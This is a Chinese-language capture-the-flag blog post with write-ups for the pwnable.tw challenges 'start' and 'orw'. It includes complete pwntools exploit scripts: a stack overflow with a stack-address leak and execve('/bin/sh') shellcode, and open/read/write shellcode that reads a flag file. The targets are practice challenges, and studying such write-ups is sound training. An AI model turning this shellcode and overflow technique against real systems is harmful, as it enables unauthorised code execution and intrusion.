---
layout:     post
title:      pawnable.tw解出题目的wp
subtitle:   write up
date:       2020-10-22
author:     X1ng
header-img: tw.jpg
catalog: true
tags:
    - pwnable.tw
    - wp

---

最近在刷pwnable.tw。。。

### 1.start

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlly1gjmh9vl628j31v402wdg4.jpg)

没有开NX保护

用ida打开

![](https://tva1.sinaimg.cn/large/007S8ZIlly1gjmh9vq0uij31wn0u0tg5.jpg)

只有start和exit函数，通过系统调用来调用函数，系统调用好保存在eax中，在执行完4号write系统调用和3号read系统调用后返回地址处是exit函数，可以看到即将执行ret时，esp指向地址的下一个地址是一个栈上的地址

![](https://tva1.sinaimg.cn/large/007S8ZIlly1gjmh9vez71j31bs0owaf1.jpg)

可以将其覆盖为`mov ecx,esp`，再重新执行write系统调用，就可以泄露出栈地址，再输入shellcode跳转到shellcode即可

exp:

```python
from pwn import *

r = 1
context(arch = 'i386', os = 'linux')

if r == 1 :
	p = remote('chall.pwnable.tw',10000)
else:
	p = process('./start')

mov = 0x08048087
#gdb.attach(p,'b *0x804809c')
p.recvuntil('Let\'s start the CTF:')
p.send(b'a'*0x14+p32(mov))
stack = p.recv(4)
stack = u32(stack)
print(hex(stack))

'''

mov ebx,0xffffffff
xor edx,edx
xor ecx,ecx
mov al,11
int 0x80
'''

pd = b'\xbb'+p32(stack-4+0x14+4)+b'1\xd21\xc9\xb0\x0b\xcd\x80'
pd += b'a'*(0x14-len(pd))+p32(stack-4)+b'/bin///sh\x00'
p.sendline(pd)

p.interactive()
```

### 2.orw

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlly1gjmhhgdf2fj30qi07ugnk.jpg)

ida反汇编

![](https://tva1.sinaimg.cn/large/007S8ZIlly1gjmhhggm0ej316a0c4t9m.jpg)

根据题目提示只能使用open，read，write

在kali上不管输入什么都是段错误，用ubuntu16可以正常写入shellcode

在shellcode后面

![](https://tva1.sinaimg.cn/large/007S8ZIlly1gjmhhg52zcj314c0eqagd.jpg)

exp:

```python
from pwn import *

r = 1
context(arch = 'i386', os = 'linux')
bss = 0x0804A040

if r == 1 :
	p = remote('chall.pwnable.tw',10001)
else:
	p = process('./orw')
#gdb.attach(p,'b *0x804858a')
p.recvuntil('shellcode:')


#fd = open('/home/orw/flag',0)
s = '''
xor edx,edx;
mov ecx,0;
mov ebx,0x804a094;
mov eax,5;
int 0x80;
'''

#read(fd,0x804a094,0x20)
s += '''
mov edx,0x40;
mov ecx,ebx;
mov ebx,eax;
mov eax,3;
int 0x80;
'''

#write(1,0x804a094,0x20)
s += '''
mov edx,0x40;
mov ebx,1;
mov eax,4
int 0x80;
'''
pd = asm(s)+b'/home/orw/flag\x00'
p.send(pd)
print p.recv()

p.interactive()
```



